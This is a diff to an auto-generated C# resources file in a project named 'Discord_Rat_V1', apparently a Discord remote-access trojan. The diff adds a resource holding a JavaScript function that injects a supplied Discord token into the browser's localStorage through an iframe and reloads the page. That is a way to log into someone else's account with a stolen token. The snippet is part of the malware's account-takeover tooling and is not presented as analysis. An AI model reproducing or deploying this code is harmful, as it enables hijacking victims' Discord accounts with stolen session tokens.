@@ -101,6 +101,24 @@ namespace Discord_Rat_V1.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized string similar to function login(token) {
+        ///    setInterval(() =&gt; {
+        ///      document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `&quot;${token}&quot;`
+        ///    }, 50);
+        ///    setTimeout(() =&gt; {
+        ///      location.reload();
+        ///    }, 2500);
+        ///  }
+        ///
+        ///login(.
+        /// </summary>
+        internal static string login {
+            get {
+                return ResourceManager.GetString("login", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized resource of type System.Drawing.Bitmap.
         /// </summary>
         internal static System.Drawing.Bitmap Steps {
